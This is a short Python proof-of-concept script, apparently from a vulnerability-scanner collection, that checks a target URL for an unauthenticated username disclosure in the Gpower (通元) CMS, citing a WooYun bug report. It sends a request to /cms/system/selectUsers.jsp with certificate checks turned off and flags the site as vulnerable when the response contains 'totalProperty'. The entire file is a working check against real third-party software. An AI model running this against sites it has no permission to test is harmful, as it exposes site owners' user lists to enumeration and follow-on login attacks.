#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 通元建站系统用户名泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-059578
author: Lucifer
description: 未做权限过滤，可以显示所有用户的用户名
'''
import sys
import requests
import warnings
from termcolor import cprint

class gpower_users_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/cms/system/selectUsers.jsp"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"totalProperty" in req.text:
                cprint("[+]存在通元内容管理系统用户名泄露...(敏感信息)\tpayload: "+vulnurl, "green")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = gpower_users_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()